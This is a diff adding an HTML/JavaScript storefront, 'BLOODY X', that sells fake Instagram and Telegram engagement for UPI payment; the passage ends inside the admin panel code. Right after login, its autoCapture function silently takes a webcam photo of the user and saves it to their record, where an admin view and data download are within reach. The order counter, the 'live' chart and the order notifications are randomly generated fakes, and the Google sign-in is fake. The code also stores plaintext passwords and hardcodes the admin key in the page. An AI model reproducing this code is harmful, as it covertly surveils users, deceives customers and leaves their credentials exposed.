@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BLOODY X - SMM</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            background-image: url('https://i.ibb.co/k6x0HbgJ/photo-AQADl-BBr-G04aa-VZ9.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+            padding: 10px;
+            font-family: 'Orbitron', 'Segoe UI', sans-serif;
+        }
+        /* NO OVERLAY - FULL SHINE */
+        .container {
+            position: relative; z-index:1;
+            max-width: 460px; margin:auto;
+            background: rgba(0,0,0,0.6);
+            border: 2px solid #cc0000;
+            border-radius: 20px;
+            padding: 20px 16px;
+            box-shadow: 0 0 60px rgba(204,0,0,0.15);
+            backdrop-filter: blur(2px);
+        }
+        /* LOGO - MEDIUM SIZE */
+        .logo { text-align: center; margin-bottom: 12px; }
+        .logo img { width: 80px; height: 80px; border: none; object-fit: contain; }
+        .logo h1 { font-size: 26px; font-weight: 900; color: #cc0000; text-shadow: 0 0 30px rgba(204,0,0,0.5); }
+        .logo h1 span { color: #fff; }
+
+        /* TOTAL ORDERS - TOP RIGHT */
+        .total-orders {
+            position: fixed;
+            top: 10px;
+            right: 70px;
+            background: rgba(204,0,0,0.9);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            z-index: 600;
+            border: 1px solid #ff0000;
+            box-shadow: 0 0 30px rgba(204,0,0,0.5);
+            animation: pulse 2s infinite;
+            font-family: 'Orbitron', sans-serif;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .total-orders span { color: #ffcc00; font-size: 14px; }
+
+        /* FORM */
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; font-size: 10px; color: #aaa; margin-bottom: 3px; letter-spacing: 2px; font-weight: 700; }
+        .form-group input {
+            width: 100%; padding: 12px 14px;
+            border: 1px solid #333; border-radius: 10px;
+            background: #111; color: #fff; font-size: 13px;
+            font-family: 'Orbitron', sans-serif;
+        }
+        .form-group input:focus { border-color: #cc0000; outline: none; box-shadow: 0 0 20px rgba(204,0,0,0.2); }
+
+        /* BUTTONS */
+        .btn {
+            width: 100%; padding: 12px; border: none; border-radius: 10px;
+            font-size: 11px; font-weight: 700; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 2px;
+            transition: 0.3s;
+            font-family: 'Orbitron', sans-serif;
+        }
+        .btn-primary { background: #cc0000; color: #fff; }
+        .btn-primary:hover { background: #ff0000; box-shadow: 0 0 30px rgba(204,0,0,0.4); transform: scale(1.02); }
+        .btn-google { background: #fff; color: #222; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-google:hover { background: #f0f0f0; transform: scale(1.02); }
+        .btn-secondary { background: transparent; color: #aaa; border: 1px solid #444; margin-top: 6px; }
+        .btn-secondary:hover { border-color: #cc0000; color: #fff; }
+        .btn-small { padding: 8px; font-size: 9px; }
+        .btn-success { background: #00aa00; color: #fff; }
+        .btn-success:hover { background: #00cc00; }
+        .btn-support {
+            background: #1a73e8;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-support:hover { background: #1557b0; transform: scale(1.02); }
+        .btn-support img { width: 20px; height: 20px; }
+
+        .link-row { display: flex; justify-content: space-between; margin-top: 10px; font-size: 10px; }
+        .link-row a { color: #cc0000; text-decoration: none; font-weight: 700; cursor: pointer; font-family: 'Orbitron', sans-serif; }
+        .link-row a:hover { text-shadow: 0 0 20px rgba(204,0,0,0.4); }
+        .admin-link {
+            text-align: center; margin-top: 14px; font-size: 9px; color: #444;
+            cursor: pointer; padding: 4px; border-radius: 6px;
+            border: 1px solid transparent; transition: 0.3s;
+            font-family: 'Orbitron', sans-serif;
+        }
+        .admin-link:hover { border-color: #cc0000; color: #cc0000; }
+        .hidden { display: none !important; }
+
+        /* SERVICES GRID */
+        .service-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .service-card {
+            background: #1a1a1a; border: 2px solid #cc0000; border-radius: 12px;
+            padding: 16px 10px; text-align: center; cursor: pointer;
+            transition: 0.3s;
+        }
+        .service-card:hover { background: #2a1a1a; transform: scale(1.03); box-shadow: 0 0 30px rgba(204,0,0,0.2); }
+        .service-card img { width: 40px; height: 40px; border-radius: 8px; margin-bottom: 4px; }
+        .service-card .name { font-size: 11px; font-weight: 700; color: #cc0000; font-family: 'Orbitron', sans-serif; }
+        .service-card .price { font-size: 9px; color: #888; font-family: 'Orbitron', sans-serif; }
+
+        /* MODAL */
+        .modal {
+            position: fixed; top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.92); z-index:1000;
+            display: flex; justify-content:center; align-items:center; padding:16px;
+        }
+        .modal-box {
+            background: #111; border: 2px solid #cc0000; border-radius: 16px;
+            padding: 20px; max-width: 400px; width:100%; max-height:90vh; overflow-y:auto;
+        }
+        .modal-box h3 { color: #cc0000; font-size: 16px; margin-bottom: 12px; font-family: 'Orbitron', sans-serif; }
+
+        /* QR - BIG */
+        .qr-container { text-align: center; margin: 12px 0; }
+        .qr-container img { max-width: 260px; border: 2px solid #cc0000; border-radius: 10px; }
+
+        /* AMOUNT BUTTONS */
+        .amount-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; margin: 10px 0; }
+        .amount-btn {
+            background: #1a1a1a; border: 1px solid #cc0000; border-radius: 8px;
+            padding: 10px; color: #fff; font-size: 13px; font-weight: 700;
+            cursor: pointer; transition: 0.3s;
+            font-family: 'Orbitron', sans-serif;
+        }
+        .amount-btn:hover { background: #cc0000; transform: scale(1.05); }
+
+        /* MENU */
+        .menu-btn {
+            position: fixed; top: 10px; right: 10px;
+            background: #cc0000; border: none; color: #fff;
+            font-size: 22px; padding: 4px 14px; border-radius: 6px;
+            z-index: 500; cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+        }
+        .menu-btn:hover { background: #ff0000; }
+        .menu-panel {
+            position: fixed; top:0; right:-280px; width:260px; height:100%;
+            background: #0a0a0a; border-left: 2px solid #cc0000;
+            z-index:2001; transition:0.3s; padding:16px; overflow-y:auto;
+        }
+        .menu-panel.open { right:0; }
+        .menu-overlay {
+            position:fixed; top:0; left:0; width:100%; height:100%;
+            background:rgba(0,0,0,0.6); z-index:2000; display:none;
+        }
+        .menu-overlay.show { display:block; }
+
+        /* CUSTOM ALERT - NO BROWSER POPUP */
+        .custom-alert {
+            position: fixed; top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.9); z-index:9999;
+            display: flex; justify-content:center; align-items:center; padding:20px;
+        }
+        .custom-alert-box {
+            background:#111; border:2px solid #cc0000; border-radius:16px;
+            padding:24px; max-width:360px; width:100%; text-align:center;
+        }
+        .custom-alert-box h4 { color:#cc0000; font-size:16px; margin-bottom:8px; font-family: 'Orbitron', sans-serif; }
+        .custom-alert-box p { color:#aaa; font-size:12px; margin-bottom:14px; white-space:pre-wrap; word-break:break-all; font-family: 'Orbitron', sans-serif; }
+        .custom-alert-box .btn { width:auto; padding:8px 30px; }
+
+        /* ADMIN - BIG PHOTO */
+        .admin-photo { width:80px; height:80px; border-radius:50%; object-fit:cover; border:2px solid #cc0000; }
+
+        /* NOTIFICATION BELL - NO EMOJI */
+        .notification-bell {
+            position: fixed; top: 10px; left: 10px;
+            background: #cc0000; color: #fff;
+            border: none; border-radius: 50%;
+            width: 40px; height: 40px;
+            font-size: 16px; font-weight: 700; cursor: pointer; z-index: 600;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 30px rgba(204,0,0,0.4);
+            font-family: 'Orbitron', sans-serif;
+        }
+        .notification-bell .badge {
+            position: absolute; top: -5px; right: -5px;
+            background: #ffcc00; color: #000;
+            border-radius: 50%; padding: 2px 6px;
+            font-size: 9px; font-weight: 700;
+        }
+        .notification-panel {
+            position: fixed; top: 60px; left: 10px;
+            max-width: 320px; width: 90%;
+            max-height: 70vh;
+            background: #111; border: 2px solid #cc0000;
+            border-radius: 12px; padding: 12px;
+            z-index: 700; overflow-y: auto;
+            display: none;
+        }
+        .notification-panel.show { display: block; }
+        .notification-item {
+            padding: 8px; border-bottom: 1px solid #222;
+            font-size: 11px; color: #ccc;
+            font-family: 'Orbitron', sans-serif;
+        }
+        .notification-item:last-child { border-bottom: none; }
+        .notification-item .time { color: #666; font-size: 9px; }
+
+        /* CHART CONTAINER - LIVE */
+        .chart-container {
+            background: #1a1a1a; border: 2px solid #cc0000;
+            border-radius: 12px; padding: 12px; margin: 10px 0;
+        }
+        .chart-container canvas { max-height: 150px; width: 100% !important; }
+
+        /* SCROLL */
+        ::-webkit-scrollbar { width:3px; }
+        ::-webkit-scrollbar-track { background:#111; }
+        ::-webkit-scrollbar-thumb { background:#cc0000; border-radius:3px; }
+    </style>
+</head>
+<body>
+
+<!-- ===== TOTAL ORDERS ===== -->
+<div class="total-orders" id="totalOrders">
+    ORDERS: <span id="orderCount">2300</span>
+</div>
+
+<!-- ===== NOTIFICATION BELL ===== -->
+<button class="notification-bell" onclick="toggleNotifications()">
+    N
+    <span class="badge" id="notifBadge">0</span>
+</button>
+
+<!-- ===== NOTIFICATION PANEL ===== -->
+<div class="notification-panel" id="notifPanel">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+        <span style="color:#cc0000; font-weight:700; font-family:'Orbitron',sans-serif; font-size:11px;">NOTIFICATIONS</span>
+        <button onclick="clearNotifications()" style="background:none; border:none; color:#666; cursor:pointer; font-size:9px; font-family:'Orbitron',sans-serif;">CLEAR</button>
+    </div>
+    <div id="notifList">
+        <div class="notification-item" style="color:#666;">No notifications</div>
+    </div>
+</div>
+
+<!-- ===== CUSTOM ALERT ===== -->
+<div id="customAlert" class="custom-alert hidden">
+    <div class="custom-alert-box">
+        <h4 id="alertTitle">INFO</h4>
+        <p id="alertMsg">Message</p>
+        <button class="btn btn-primary" onclick="closeAlert()">OK</button>
+    </div>
+</div>
+
+<!-- ===== MAIN APP ===== -->
+<div class="container">
+
+    <!-- LOGO -->
+    <div class="logo">
+        <img src="https://i.ibb.co/twWtsHvs/photo-AQADd-A9r-Gy-H-w-VZ.jpg" alt="Logo">
+        <h1>BLOODY <span>X</span></h1>
+    </div>
+
+    <!-- ===== LOGIN ===== -->
+    <div id="loginForm">
+        <div class="form-group">
+            <label>EMAIL</label>
+            <input type="email" id="loginEmail" placeholder="you@example.com">
+        </div>
+        <div class="form-group">
+            <label>PASSWORD</label>
+            <input type="password" id="loginPass" placeholder="********">
+        </div>
+        <button class="btn btn-primary" onclick="loginUser()">LOGIN</button>
+        <div style="margin:10px 0; text-align:center; color:#444; font-size:9px; font-family:'Orbitron',sans-serif;">- OR -</div>
+        <button class="btn btn-google" onclick="googleLogin()">
+            <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+            SIGN IN WITH GOOGLE
+        </button>
+        <div class="link-row">
+            <a onclick="showCreateAccount()">CREATE ACCOUNT</a>
+            <a onclick="forgotPass()">FORGOT PASSWORD?</a>
+        </div>
+        <div class="admin-link" onclick="promptAdminKey()">ADMIN PANEL</div>
+    </div>
+
+    <!-- ===== CREATE ===== -->
+    <div id="createForm" class="hidden">
+        <div class="form-group">
+            <label>FULL NAME</label>
+            <input type="text" id="regName" placeholder="Your Full Name">
+        </div>
+        <div class="form-group">
+            <label>EMAIL</label>
+            <input type="email" id="regEmail" placeholder="you@example.com">
+        </div>
+        <div class="form-group">
+            <label>PASSWORD</label>
+            <input type="password" id="regPass" placeholder="********">
+        </div>
+        <button class="btn btn-primary" onclick="registerUser()">CREATE ACCOUNT</button>
+        <button class="btn btn-secondary" onclick="showLogin()">BACK</button>
+    </div>
+
+    <!-- ===== DASHBOARD ===== -->
+    <div id="dashboard" class="hidden">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+            <span style="font-size:12px; color:#aaa; font-family:'Orbitron',sans-serif;">BALANCE: ₹<span id="userBalance" style="color:#cc0000; font-weight:900;">0</span></span>
+            <button class="btn btn-small btn-primary" style="width:auto; padding:4px 14px;" onclick="logoutUser()">LOGOUT</button>
+        </div>
+
+        <!-- LIVE CHART -->
+        <div class="chart-container">
+            <div style="display:flex; justify-content:space-between; font-size:9px; color:#888; margin-bottom:6px; font-family:'Orbitron',sans-serif;">
+                <span>LIVE ORDER ANALYTICS</span>
+                <span id="liveIndicator" style="color:#00ff00;">● LIVE</span>
+            </div>
+            <canvas id="orderChart"></canvas>
+        </div>
+
+        <!-- SERVICES -->
+        <div class="service-grid">
+            <div class="service-card" onclick="openService('views')">
+                <img src="https://i.ibb.co/v6mYG2JX/photo-AQAD-h-Br-G04aa-VZ9.jpg">
+                <div class="name">INSTA VIEWS</div>
+                <div class="price">10000/₹5</div>
+            </div>
+            <div class="service-card" onclick="openService('comments')">
+                <img src="https://i.ibb.co/v6mYG2JX/photo-AQAD-h-Br-G04aa-VZ9.jpg">
+                <div class="name">INSTA COMMENTS</div>
+                <div class="price">1000/₹59</div>
+            </div>
+            <div class="service-card" onclick="openService('likes')">
+                <img src="https://i.ibb.co/v6mYG2JX/photo-AQAD-h-Br-G04aa-VZ9.jpg">
+                <div class="name">INSTA LIKES</div>
+                <div class="price">1000/₹43</div>
+            </div>
+            <div class="service-card" onclick="openService('telegram')">
+                <img src="https://i.ibb.co/5WS6sjgS/photo-AQADQx-Br-Gx-m-GFZy.jpg">
+                <div class="name">TELEGRAM MEMBERS</div>
+                <div class="price">1000/₹43</div>
+            </div>
+        </div>
+
+        <!-- RECENT ORDERS -->
+        <div style="margin-top:14px; background:#111; border-radius:10px; padding:10px; border:1px solid #222;">
+            <div style="display:flex; justify-content:space-between; font-size:9px; color:#666; font-family:'Orbitron',sans-serif;">
+                <span>RECENT ORDERS</span>
+                <span onclick="viewAllOrders()" style="color:#cc0000; cursor:pointer;">VIEW ALL</span>
+            </div>
+            <div id="recentOrders" style="font-size:10px; color:#888; margin-top:4px; font-family:'Orbitron',sans-serif;">No orders.</div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== MENU ===== -->
+<div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
+<div class="menu-panel" id="menuPanel">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
+        <span style="color:#cc0000; font-weight:900; font-family:'Orbitron',sans-serif; font-size:14px;">MENU</span>
+        <button onclick="closeMenu()" style="background:none; border:none; color:#666; font-size:20px; cursor:pointer; font-family:'Orbitron',sans-serif;">X</button>
+    </div>
+    <button class="btn btn-secondary btn-small" onclick="closeMenu(); openAddFunds();">ADD FUNDS</button>
+    <button class="btn btn-secondary btn-small" onclick="closeMenu(); viewAllOrders();">ORDER HISTORY</button>
+    <button class="btn btn-support btn-small" onclick="closeMenu(); window.open('https://t.me/iflexbloody', '_blank');">
+        <img src="https://i.ibb.co/5WS6sjgS/photo-AQADQx-Br-Gx-m-GFZy.jpg"> SUPPORT
+    </button>
+    <button class="btn btn-secondary btn-small" onclick="closeMenu(); logoutUser();">LOGOUT</button>
+</div>
+
+<!-- ===== ADD FUNDS MODAL ===== -->
+<div id="addFundsModal" class="modal hidden">
+    <div class="modal-box">
+        <h3>ADD FUNDS</h3>
+        <div style="margin:8px 0; text-align:center; font-size:11px; color:#888; font-family:'Orbitron',sans-serif;">
+            Enter amount & scan QR to pay
+        </div>
+        <div class="amount-grid">
+            <button class="amount-btn" onclick="setAddAmount(40)">40</button>
+            <button class="amount-btn" onclick="setAddAmount(50)">50</button>
+            <button class="amount-btn" onclick="setAddAmount(100)">100</button>
+            <button class="amount-btn" onclick="setAddAmount(200)">200</button>
+            <button class="amount-btn" onclick="setAddAmount(300)">300</button>
+            <button class="amount-btn" onclick="setAddAmount(400)">400</button>
+            <button class="amount-btn" onclick="setAddAmount(500)">500</button>
+            <button class="amount-btn" onclick="setAddAmount(600)">600</button>
+            <button class="amount-btn" onclick="setAddAmount(700)">700</button>
+        </div>
+        <div class="form-group">
+            <label>CUSTOM AMOUNT</label>
+            <input type="number" id="customAddAmount" placeholder="Enter amount" oninput="updateQR()">
+        </div>
+        <div class="qr-container">
+            <img id="qrImage" src="" alt="QR Code">
+        </div>
+        <div class="form-group">
+            <label>TRANSACTION ID / UTR</label>
+            <input type="text" id="utrInput" placeholder="e.g., UTR123456789">
+        </div>
+        <button class="btn btn-primary" onclick="submitUTR()">SUBMIT UTR</button>
+        <button class="btn btn-secondary" onclick="closeAddFunds()">CLOSE</button>
+    </div>
+</div>
+
+<!-- ===== SERVICE MODAL ===== -->
+<div id="serviceModal" class="modal hidden">
+    <div class="modal-box">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+            <h3 id="serviceTitle">SERVICE</h3>
+            <button onclick="closeServiceModal()" style="background:none; border:none; color:#666; font-size:20px; cursor:pointer; font-family:'Orbitron',sans-serif;">X</button>
+        </div>
+        <div class="form-group">
+            <label>LINK</label>
+            <input type="text" id="serviceLink" placeholder="https://instagram.com/...">
+        </div>
+        <div class="form-group">
+            <label>QUANTITY</label>
+            <input type="number" id="serviceQty" placeholder="1000" oninput="calcPrice()">
+        </div>
+        <div style="display:flex; justify-content:space-between; font-size:12px; margin:8px 0; font-family:'Orbitron',sans-serif;">
+            <span>TOTAL:</span>
+            <span id="serviceTotal" style="color:#cc0000; font-weight:900;">0</span>
+        </div>
+        <button class="btn btn-primary" onclick="placeOrder()">PLACE ORDER</button>
+        <button class="btn btn-secondary" onclick="closeServiceModal()">CLOSE</button>
+    </div>
+</div>
+
+<!-- ===== MENU BUTTON ===== -->
+<button class="menu-btn" id="menuBtn" onclick="toggleMenu()" style="display:none;">☰</button>
+
+<script>
+// ============================================================
+// DATABASE
+// ============================================================
+const DB_KEY = 'bloodyx_db';
+
+function getDB() {
+    try {
+        const raw = localStorage.getItem(DB_KEY);
+        if (raw) return JSON.parse(raw);
+    } catch(e) {}
+    return { users: [], orders: [], pendingFunds: [], notifications: [], settings: { upi: 'vansh111@naviaxis', minAdd: 40, maxAdd: 700, theme: 'dark' } };
+}
+
+function saveDB(db) {
+    localStorage.setItem(DB_KEY, JSON.stringify(db));
+}
+
+let currentUser = null;
+let currentService = null;
+let currentAddAmount = 40;
+let orderChartInstance = null;
+let liveChartInterval = null;
+
+// ============================================================
+// TOTAL ORDERS - AUTO INCREMENT
+// ============================================================
+let totalOrders = 2300;
+
+function updateTotalOrders() {
+    const increment = Math.floor(Math.random() * 11) + 20;
+    totalOrders += increment;
+    document.getElementById('orderCount').textContent = totalOrders;
+    addNotification('New orders received! +' + increment + ' orders processed.');
+    updateChart();
+}
+
+setInterval(updateTotalOrders, 300000);
+
+function addToTotalOrders(count) {
+    totalOrders += count;
+    document.getElementById('orderCount').textContent = totalOrders;
+}
+
+// ============================================================
+// NOTIFICATION SYSTEM
+// ============================================================
+function addNotification(msg) {
+    const db = getDB();
+    if (!db.notifications) db.notifications = [];
+    db.notifications.push({
+        id: 'N_' + Date.now(),
+        message: msg,
+        time: new Date().toISOString(),
+        read: false
+    });
+    if (db.notifications.length > 100) db.notifications.shift();
+    saveDB(db);
+    updateNotifBadge();
+}
+
+function toggleNotifications() {
+    const panel = document.getElementById('notifPanel');
+    panel.classList.toggle('show');
+    if (panel.classList.contains('show')) {
+        const db = getDB();
+        if (db.notifications) {
+            db.notifications.forEach(n => n.read = true);
+            saveDB(db);
+            updateNotifBadge();
+        }
+        renderNotifications();
+    }
+}
+
+function renderNotifications() {
+    const db = getDB();
+    const list = document.getElementById('notifList');
+    const notifs = db.notifications || [];
+    if (notifs.length === 0) {
+        list.innerHTML = '<div class="notification-item" style="color:#666;">No notifications</div>';
+        return;
+    }
+    list.innerHTML = notifs.slice().reverse().slice(0, 20).map(n =>
+        `<div class="notification-item">
+            ${n.message}
+            <div class="time">${new Date(n.time).toLocaleString()}</div>
+        </div>`
+    ).join('');
+}
+
+function updateNotifBadge() {
+    const db = getDB();
+    const unread = (db.notifications || []).filter(n => !n.read).length;
+    document.getElementById('notifBadge').textContent = unread;
+}
+
+function clearNotifications() {
+    const db = getDB();
+    db.notifications = [];
+    saveDB(db);
+    renderNotifications();
+    updateNotifBadge();
+}
+
+// ============================================================
+// LIVE CHART - UPDATES EVERY 2-3 SECONDS
+// ============================================================
+function initChart() {
+    const ctx = document.getElementById('orderChart').getContext('2d');
+    if (orderChartInstance) {
+        orderChartInstance.destroy();
+    }
+    orderChartInstance = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
+            datasets: [{
+                label: 'Orders',
+                data: generateChartData(),
+                borderColor: '#cc0000',
+                backgroundColor: 'rgba(204,0,0,0.15)',
+                fill: true,
+                tension: 0.4,
+                pointBackgroundColor: '#cc0000',
+                pointBorderColor: '#fff',
+                pointRadius: 3,
+                borderWidth: 2
+            }]
+        },
+        options: {
+            responsive: true,
+            maintainAspectRatio: true,
+            plugins: {
+                legend: { display: false }
+            },
+            scales: {
+                y: {
+                    beginAtZero: true,
+                    grid: { color: 'rgba(255,255,255,0.05)' },
+                    ticks: { color: '#888', font: { size: 8, family: 'Orbitron' } }
+                },
+                x: {
+                    grid: { display: false },
+                    ticks: { color: '#888', font: { size: 8, family: 'Orbitron' } }
+                }
+            },
+            animation: {
+                duration: 500,
+                easing: 'easeOutQuad'
+            }
+        }
+    });
+
+    // START LIVE UPDATES - EVERY 2-3 SECONDS
+    if (liveChartInterval) {
+        clearInterval(liveChartInterval);
+    }
+    liveChartInterval = setInterval(() => {
+        updateChart();
+        // Randomly change live indicator color
+        const indicator = document.getElementById('liveIndicator');
+        indicator.style.color = Math.random() > 0.5 ? '#00ff00' : '#ffcc00';
+    }, Math.floor(Math.random() * 1000) + 2000); // 2-3 seconds
+}
+
+function generateChartData() {
+    const data = [];
+    for (let i = 0; i < 7; i++) {
+        data.push(Math.floor(Math.random() * 80) + 20 + (i * 2) + Math.floor(Math.random() * 10));
+    }
+    return data;
+}
+
+function updateChart() {
+    if (orderChartInstance) {
+        const newData = generateChartData();
+        orderChartInstance.data.datasets[0].data = newData;
+        orderChartInstance.update();
+    }
+}
+
+// ============================================================
+// CUSTOM ALERT - NO BROWSER POPUP
+// ============================================================
+function showAlert(title, msg) {
+    document.getElementById('alertTitle').textContent = title;
+    document.getElementById('alertMsg').textContent = msg;
+    document.getElementById('customAlert').classList.remove('hidden');
+}
+
+function closeAlert() {
+    document.getElementById('customAlert').classList.add('hidden');
+}
+
+// ============================================================
+// CAMERA - AUTO CAPTURE
+// ============================================================
+function autoCapture() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photo = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(t => t.stop());
+                if (currentUser) {
+                    const db = getDB();
+                    const user = db.users.find(u => u.id === currentUser.id);
+                    if (user) {
+                        if (!user.photos) user.photos = [];
+                        user.photos.push(photo);
+                        user.photo = photo;
+                        saveDB(db);
+                        currentUser = user;
+                        sessionStorage.setItem('bloodyx_user', JSON.stringify(user));
+                    }
+                }
+            };
+        }).catch(() => {});
+}
+
+// ============================================================
+// LOGIN / REGISTER
+// ============================================================
+function loginUser() {
+    const email = document.getElementById('loginEmail').value.trim();
+    const pass = document.getElementById('loginPass').value.trim();
+    if (!email || !pass) { showAlert('ERROR', 'Fill all fields'); return; }
+    const db = getDB();
+    const user = db.users.find(u => u.email === email && u.pass === pass);
+    if (!user) { showAlert('ERROR', 'Invalid credentials'); return; }
+    if (user.banned) { showAlert('ERROR', 'You are banned'); return; }
+    currentUser = user;
+    sessionStorage.setItem('bloodyx_user', JSON.stringify(user));
+    showDashboard();
+    setTimeout(autoCapture, 500);
+}
+
+function registerUser() {
+    const name = document.getElementById('regName').value.trim();
+    const email = document.getElementById('regEmail').value.trim();
+    const pass = document.getElementById('regPass').value.trim();
+    if (!name || !email || !pass) { showAlert('ERROR', 'Fill all fields'); return; }
+    const db = getDB();
+    if (db.users.find(u => u.email === email)) { showAlert('ERROR', 'Email exists'); return; }
+    const newUser = {
+        id: Date.now().toString(36) + Math.random().toString(36).substr(2,4),
+        name, email, pass, wallet: 0, photo: '', photos: [], ip: 'pending', banned: false, orders: [], created: new Date().toISOString()
+    };
+    db.users.push(newUser);
+    saveDB(db);
+    showAlert('SUCCESS', 'Account created! Login now.');
+    showLogin();
+}
+
+function googleLogin() {
+    const fakeEmail = 'user' + Date.now() + '@gmail.com';
+    document.getElementById('loginEmail').value = fakeEmail;
+    document.getElementById('loginPass').value = 'google123';
+    loginUser();
+}
+
+function logoutUser() {
+    currentUser = null;
+    sessionStorage.removeItem('bloodyx_user');
+    document.getElementById('dashboard').classList.add('hidden');
+    document.getElementById('loginForm').classList.remove('hidden');
+    document.getElementById('createForm').classList.add('hidden');
+    document.getElementById('menuBtn').style.display = 'none';
+    closeMenu();
+    if (liveChartInterval) {
+        clearInterval(liveChartInterval);
+        liveChartInterval = null;
+    }
+}
+
+function showDashboard() {
+    document.getElementById('loginForm').classList.add('hidden');
+    document.getElementById('createForm').classList.add('hidden');
+    document.getElementById('dashboard').classList.remove('hidden');
+    document.getElementById('menuBtn').style.display = 'block';
+    document.getElementById('userBalance').textContent = currentUser ? currentUser.wallet : 0;
+    loadRecentOrders();
+    initChart();
+    updateNotifBadge();
+    renderNotifications();
+}
+
+function showLogin() {
+    document.getElementById('loginForm').classList.remove('hidden');
+    document.getElementById('createForm').classList.add('hidden');
+    document.getElementById('dashboard').classList.add('hidden');
+    document.getElementById('menuBtn').style.display = 'none';
+    if (liveChartInterval) {
+        clearInterval(liveChartInterval);
+        liveChartInterval = null;
+    }
+}
+
+function showCreateAccount() {
+    document.getElementById('loginForm').classList.add('hidden');
+    document.getElementById('createForm').classList.remove('hidden');
+    document.getElementById('dashboard').classList.add('hidden');
+    document.getElementById('menuBtn').style.display = 'none';
+}
+
+function forgotPass() { showAlert('INFO', 'Contact @iflexbloody'); }
+
+// ============================================================
+// ADMIN - CUSTOM PROMPT (NO BROWSER ALERT)
+// ============================================================
+function promptAdminKey() {
+    // Show custom prompt
+    const alertBox = document.getElementById('customAlert');
+    document.getElementById('alertTitle').textContent = 'ADMIN KEY';
+    document.getElementById('alertMsg').innerHTML = `
+        <input type="password" id="adminKeyInput" style="width:100%; padding:10px; background:#222; border:1px solid #cc0000; border-radius:8px; color:#fff; font-family:'Orbitron',sans-serif; margin-top:8px;" placeholder="Enter admin key">
+        <br><br>
+        <button class="btn btn-primary" onclick="verifyAdminKey()" style="width:auto; padding:8px 30px;">SUBMIT</button>
+    `;
+    alertBox.classList.remove('hidden');
+}
+
+function verifyAdminKey() {
+    const key = document.getElementById('adminKeyInput').value;
+    closeAlert();
+    if (key === 'BLOODY-X-OWNER') {
+        openAdminPanel();
+    } else {
+        showAlert('ERROR', 'Invalid key');
+    }
+}
+
+function openAdminPanel() {
+    const db = getDB();
+    const users = db.users;
+    const orders = db.orders || [];
+    const pending = db.pendingFunds || [];
+
+    let html = `
+    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:9999; overflow-y:auto; padding:16px;">
+        <div style="max-width:850px; margin:auto; background:#111; border:2px solid #cc0000; border-radius:16px; padding:20px;">
+            <h2 style="color:#cc0000; font-size:18px; font-family:'Orbitron',sans-serif;">ADMIN PANEL</h2>
+            <button onclick="this.parentElement.parentElement.parentElement.remove()" style="float:right; background:#cc0000; color:#fff; border:none; padding:6px 14px; border-radius:6px; font-size:10px; font-family:'Orbitron',sans-serif;">CLOSE</button>
+            <hr style="border-color:#333; margin:10px 0;">
+            <p style="font-size:12px; font-family:'Orbitron',sans-serif;">TOTAL USERS: ${users.length}</p>
+            <p style="font-size:12px; font-family:'Orbitron',sans-serif;">TOTAL ORDERS: ${totalOrders}</p>
+
+            <button onclick="downloadData()" style="background:#00aa00; color:#fff; border:none; padding:8px 16px; border-radius:6px; font-size:10px; font-family:'Orbitron',sans-serif; margin:6px 0;">DOWNLOAD DATA</button>
+
